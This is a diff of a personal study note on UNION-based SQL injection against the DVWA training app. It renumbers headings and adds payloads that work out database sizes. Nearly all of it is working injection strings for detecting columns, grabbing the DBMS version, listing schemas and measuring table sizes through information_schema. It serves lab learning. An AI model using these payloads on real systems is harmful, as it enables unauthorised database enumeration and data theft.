@@ -2,13 +2,11 @@
 
 Search Tag: #sql-injection #union #enumeration-and-discovery #dvwa
 
-## 1.1 - Dump Database
-
-### 1.1.1 - Columns Enumeration
+## 1.1 - Columns Enumeration
 
 ^78ef92
 
-#### 1.1.1.1 - UNION Detection
+### 1.1.1 - UNION Detection
 
 We can double confirm using [[Tactics && Techniques && Procedures (TTPs) Phases/WebApp Hacking/Injection/SQL Injection/01 - In-Band SQL Injection/Lab Simulation/01 - DVWA/Difficulty/Low/Manual/02 - Error-Based Query SQL Injection/01 - Database Reconnaissance#^f521af|error-based (ORDER BY)]] fields enumeration.
 
@@ -22,11 +20,11 @@ We can double confirm using [[Tactics && Techniques && Procedures (TTPs) Phases/
 ' UNION SELECT NULL, NULL, NULL#
 ```
 
-### 1.1.2 - Enumeration and Discovery
+## 1.2 - Enumeration and Discovery
 
-#### 1.1.2.1 - UNION Enumeration
+### 1.2.1 - UNION Enumeration
 
-##### 1.1.2.1.1 - Banner Grab
+#### 1.2.1.1 - Banner Grab
 
 Sometimes when we try to retrieve error messages. Sometimes the warning messages may not provide us the SQL server software might be running. However, we can discover it even further to grab the version of the DBMS back-end software is running.
 
@@ -44,7 +42,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 
 ![[1.1 - Banner Grab.png]]
 
-##### 1.1.2.1.2 - Current Database
+#### 1.2.1.2 - Current Database
 
 ```sql
 ' UNION SELECT NULL, DATABASE()#
@@ -54,7 +52,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 
 ![[1.2 - Current Database.png]]
 
-##### 1.1.2.1.3 - Current Database User
+#### 1.2.1.3 - Current Database User
 
 ```sql
 ' UNION SELECT NULL, USER()#
@@ -64,7 +62,7 @@ Sometimes when we try to retrieve error messages. Sometimes the warning messages
 
 ![[1.3 - Current User.png]]
 
-#### 1.1.2.2 - Schema Database Enumeration
+#### 1.2.1.4 - Schema Database Enumeration
 
 ```sql
 ' UNION SELECT NULL, schema_name FROM information_schema.schemata#
@@ -109,4 +107,60 @@ Let's note down the columns we've discovered that are potential to retrieve data
 ```
 user
 password
+```
+
+## 1.2 - Calculate Size
+
+### 1.2.1 - Database Size
+
+#### 1.2.1.1 - All Databases
+
+- Bytes
+
+```sql
+' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 , 2) FROM information_schema.tables#
+
+' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+
+' UNION SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size, '\n'), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+```
+
+- Kilobytes
+
+```sql
+' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 , 2) FROM information_schema.tables GROUP BY table_schema#
+
+' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+
+' UNION SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' KB Size: ', db_size, '\n'), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+```
+
+- Megabytes
+
+```sql
+' UNION SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) FROM information_schema.tables GROUP BY table_schema#
+
+' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+
+' UNION SELECT GROUP_CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size, '\n'), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables GROUP BY table_schema) AS subquery#
+```
+
+#### 1.2.1.2 - Current Database
+
+- Bytes
+
+```sql
+' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' Bytes Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length)) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
+```
+
+- Megabytes
+
+```sql
+' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' MB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
+```
+
+- Gigabytes
+
+```sql
+' UNION SELECT CONCAT('Database: ', table_schema, ' -> ', ' GB Size: ', db_size), NULL FROM (SELECT table_schema, ROUND(SUM(data_length + index_length) / 1024 / 1024 / 1024, 2) AS db_size FROM information_schema.tables WHERE table_schema = database()) AS subquery#
 ```
